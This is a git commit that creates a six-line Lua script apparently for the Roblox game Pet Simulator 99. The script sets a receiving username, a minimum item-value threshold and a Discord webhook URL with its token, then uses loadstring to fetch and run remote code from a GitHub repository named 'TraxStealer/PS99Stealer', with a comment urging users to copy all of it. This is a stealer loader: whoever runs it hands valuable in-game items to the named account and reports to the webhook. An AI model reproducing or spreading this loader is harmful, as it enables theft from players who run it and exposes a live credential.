968696a411e986de9b9ce4879a89ac3b1fddc2f8
RAYZHUB <mooojjj603@gmail.com>
2025-02-19 23:15:53 +0100

    Create AGUSMIRSCRIPT.lua

---
+++ AGUSMIRSCRIPT.lua
@@ -0,0 +1,6 @@
+Username = "agusmar"
+Username2 = "agusmar"
+MinimumRAP = 75000
+Webhook = "https://discord.com/api/webhooks/1341733574524796968/JsycflB2_RpKiyp7iHQNr-_xVOfzeBosD3H511W1EUH3gxxzO4U48wIEtw7ApNoYDy4y"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))() -- copy the whole thing, even the username =
